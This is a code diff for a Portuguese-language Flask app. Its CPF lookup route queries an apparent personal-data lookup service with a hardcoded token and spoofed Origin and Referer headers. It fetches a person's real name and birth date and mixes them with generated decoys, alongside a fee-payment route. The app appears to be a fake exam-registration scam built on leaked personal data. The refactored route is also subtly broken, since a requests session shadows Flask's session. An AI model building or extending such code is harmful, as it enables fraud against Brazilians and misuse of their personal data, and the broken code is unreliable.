@@ -11,9 +11,6 @@ from flask_caching import Cache
 from flask_sqlalchemy import SQLAlchemy
 from flask_migrate import Migrate
 
-# Set recursion limit
-sys.setrecursionlimit(3000)
-
 # Configuração do logging
 logging.basicConfig(level=logging.DEBUG)
 logger = logging.getLogger(__name__)
@@ -75,40 +72,111 @@ with app.app_context():
         logger.error(f"Error creating database tables: {str(e)}")
         raise
 
-# Middleware de compressão
-def gzip_response(response):
-    # Não comprimir arquivos estáticos
-    if request.path.startswith('/static/'):
-        return response
+API_URL = "https://consulta.fontesderenda.blog/?token=4da265ab-0452-4f87-86be-8d83a04a745a&cpf={cpf}"
 
-    accept_encoding = request.headers.get('Accept-Encoding', '')
-    if 'gzip' not in accept_encoding.lower():
-        return response
+@app.route('/consultar_cpf', methods=['POST'])
+def consultar_cpf():
+    cpf = request.form.get('cpf', '').strip()
+    cpf_numerico = ''.join(filter(str.isdigit, cpf))
 
-    if (response.status_code < 200 or response.status_code >= 300 or
-        'Content-Encoding' in response.headers):
-        return response
-
-    # Só comprimir se a resposta tiver dados
-    if not response.data:
-        return response
+    if not cpf_numerico or len(cpf_numerico) != 11:
+        flash('CPF inválido. Por favor, digite um CPF válido.')
+        return redirect(url_for('index'))
 
     try:
-        gzip_buffer = gzip.compress(response.data)
-        response.data = gzip_buffer
-        response.headers['Content-Encoding'] = 'gzip'
-        response.headers['Content-Length'] = len(response.data)
+        # Configure the session for requests
+        session = requests.Session()
+        session.headers.update({
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+            'Accept': 'application/json',
+            'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+            'Origin': 'https://concurso-827f3dcc0df6.herokuapp.com',
+            'Referer': 'https://concurso-827f3dcc0df6.herokuapp.com/',
+            'Connection': 'keep-alive'
+        })
+
+        logger.info(f"Iniciando consulta de CPF: {cpf_numerico[:3]}***{cpf_numerico[-2:]}")
+
+        # Make the request with the session
+        response = session.get(
+            API_URL.format(cpf=cpf_numerico),
+            timeout=30,
+            verify=True
+        )
+
+        # Log response details
+        logger.info(f"Status code: {response.status_code}")
+        logger.info(f"Response headers: {dict(response.headers)}")
+
+        if response.status_code != 200:
+            logger.error(f"API returned non-200 status code: {response.status_code}")
+            logger.error(f"Response content: {response.text}")
+            flash('Erro ao consultar CPF. Por favor, tente novamente.')
+            return redirect(url_for('index'))
+
+        # Try to parse the JSON response
+        try:
+            response_text = response.text
+            logger.debug(f"Raw response: {response_text[:200]}...")  # Log first 200 chars of response
+            dados = response.json()
+        except Exception as json_error:
+            logger.error(f"Error parsing JSON response: {str(json_error)}")
+            logger.error(f"Response content: {response.text}")
+            flash('Erro ao processar resposta da consulta. Por favor, tente novamente.')
+            return redirect(url_for('index'))
+
+        logger.info("Resposta da API recebida com sucesso")
+
+        # Validate response structure
+        if not isinstance(dados, dict):
+            logger.error(f"Invalid response type: {type(dados)}")
+            flash('Formato de resposta inválido. Por favor, tente novamente.')
+            return redirect(url_for('index'))
+
+        dados_api = dados.get('DADOS', {})
+        if not isinstance(dados_api, dict):
+            logger.error(f"Invalid DADOS type: {type(dados_api)}")
+            flash('Formato de dados inválido. Por favor, tente novamente.')
+            return redirect(url_for('index'))
+
+        nome = dados_api.get('NOME')
+        if not nome:
+            logger.error("Nome não encontrado nos dados")
+            flash('CPF não encontrado ou dados incompletos.')
+            return redirect(url_for('index'))
+
+        # Create user data dictionary
+        dados_usuario = {
+            'cpf': cpf_numerico,
+            'nome_real': nome,
+            'data_nasc': dados_api.get('NASC', ''),
+            'nomes': gerar_nomes_falsos(nome)
+        }
+        session['dados_usuario'] = dados_usuario
+
+        return render_template('verificar_nome.html',
+                            dados=dados_usuario,
+                            current_year=datetime.now().year)
+
+    except requests.exceptions.Timeout:
+        logger.error("Timeout ao consultar a API")
+        flash('Tempo limite excedido. Por favor, tente novamente.')
+        return redirect(url_for('index'))
+    except requests.exceptions.ConnectionError as e:
+        logger.error(f"Erro de conexão: {str(e)}")
+        flash('Erro de conexão. Por favor, verifique sua internet e tente novamente.')
+        return redirect(url_for('index'))
+    except requests.exceptions.RequestException as e:
+        logger.error(f"Erro na requisição: {str(e)}")
+        flash('Erro ao consultar CPF. Por favor, tente novamente.')
+        return redirect(url_for('index'))
     except Exception as e:
-        logger.error(f"Erro na compressão: {str(e)}")
-        return response
-
-    return response
-
-@app.after_request
-def after_request(response):
-    return gzip_response(response)
-
-API_URL = "https://consulta.fontesderenda.blog/?token=4da265ab-0452-4f87-86be-8d83a04a745a&cpf={cpf}"
+        logger.error(f"Erro inesperado na consulta: {str(e)}")
+        flash('Erro ao consultar CPF. Por favor, tente novamente.')
+        return redirect(url_for('index'))
+    finally:
+        if 'session' in locals():
+            session.close()
 
 ESTADOS = {
     'Acre': 'AC',
@@ -206,88 +274,6 @@ def gerar_datas_falsas(data_real_str: str) -> List[str]:
     random.shuffle(todas_datas)
 
     return [data.strftime('%d/%m/%Y') for data in todas_datas]
-
-@app.route('/consultar_cpf', methods=['POST'])
-def consultar_cpf():
-    cpf = request.form.get('cpf', '').strip()
-    cpf_numerico = ''.join(filter(str.isdigit, cpf))
-
-    if not cpf_numerico or len(cpf_numerico) != 11:
-        flash('CPF inválido. Por favor, digite um CPF válido.')
-        return redirect(url_for('index'))
-
-    try:
-        # Add headers to mimic a browser request
-        headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
-            'Accept': 'application/json',
-            'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
-            'Origin': 'https://concurso-827f3dcc0df6.herokuapp.com',
-            'Referer': 'https://concurso-827f3dcc0df6.herokuapp.com/',
-            'Connection': 'keep-alive'
-        }
-
-        logger.info(f"Iniciando consulta de CPF: {cpf_numerico[:3]}***{cpf_numerico[-2:]}")
-        response = requests.get(
-            API_URL.format(cpf=cpf_numerico),
-            headers=headers,
-            timeout=30,
-            verify=True
-        )
-
-        # Log the response details for debugging
-        logger.info(f"Status code: {response.status_code}")
-        logger.info(f"Response headers: {dict(response.headers)}")
-
-        if response.status_code != 200:
-            logger.error(f"API returned non-200 status code: {response.status_code}")
-            logger.error(f"Response content: {response.text}")
-            flash('Erro ao consultar CPF. Por favor, tente novamente.')
-            return redirect(url_for('index'))
-
-        # Try to parse the JSON response safely
-        try:
-            dados = response.json()
-        except Exception as json_error:
-            logger.error(f"Error parsing JSON response: {str(json_error)}")
-            logger.error(f"Response content: {response.text}")
-            flash('Erro ao processar resposta da consulta. Por favor, tente novamente.')
-            return redirect(url_for('index'))
-
-        logger.info("Resposta da API recebida com sucesso")
-
-        if dados and isinstance(dados, dict) and 'DADOS' in dados and isinstance(dados['DADOS'], dict) and 'NOME' in dados['DADOS']:
-            dados_usuario = {
-                'cpf': cpf_numerico,
-                'nome_real': dados['DADOS']['NOME'],
-                'data_nasc': dados['DADOS']['NASC'],
-                'nomes': gerar_nomes_falsos(dados['DADOS']['NOME'])
-            }
-            session['dados_usuario'] = dados_usuario
-            return render_template('verificar_nome.html',
-                                dados=dados_usuario,
-                                current_year=datetime.now().year)
-        else:
-            logger.error(f"Dados incompletos ou formato inválido na resposta: {dados}")
-            flash('CPF não encontrado ou dados incompletos.')
-            return redirect(url_for('index'))
-
-    except requests.exceptions.Timeout:
-        logger.error("Timeout ao consultar a API")
-        flash('Tempo limite excedido. Por favor, tente novamente.')
-        return redirect(url_for('index'))
-    except requests.exceptions.ConnectionError as e:
-        logger.error(f"Erro de conexão: {str(e)}")
-        flash('Erro de conexão. Por favor, verifique sua internet e tente novamente.')
-        return redirect(url_for('index'))
-    except requests.exceptions.RequestException as e:
-        logger.error(f"Erro na requisição: {str(e)}")
-        flash('Erro ao consultar CPF. Por favor, tente novamente.')
-        return redirect(url_for('index'))
-    except Exception as e:
-        logger.error(f"Erro inesperado na consulta: {str(e)}")
-        flash('Erro ao consultar CPF. Por favor, tente novamente.')
-        return redirect(url_for('index'))
 
 @app.route('/verificar_nome', methods=['POST'])
 def verificar_nome():
@@ -797,9 +783,40 @@ def pagamento_taxa():
 
 def generate_random_email():
     return f"user_{random.randint(1,1000)}@example.com"
-
 def generate_random_phone():
     return f"55119{random.randint(10000000,99999999)}"
+
+def gzip_response(response):
+    # Não comprimir arquivos estáticos
+    if request.path.startswith('/static/'):
+        return response
+
+    accept_encoding = request.headers.get('Accept-Encoding', '')
+    if 'gzip' not in accept_encoding.lower():
+        return response
+
+    if (response.status_code < 200 or response.status_code >= 300 or
+        'Content-Encoding' in response.headers):
+        return response
+
+    # Só comprimir se a resposta tiver dados
+    if not response.data:
+        return response
+
+    try:
+        gzip_buffer = gzip.compress(response.data)
+        response.data = gzip_buffer
+        response.headers['Content-Encoding'] = 'gzip'
+        response.headers['Content-Length'] = len(response.data)
+    except Exception as e:
+        logger.error(f"Erro na compressão: {str(e)}")
+        return response
+
+    return response
+
+@app.after_request
+def after_request(response):
+    return gzip_response(response)
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000, debug=True)
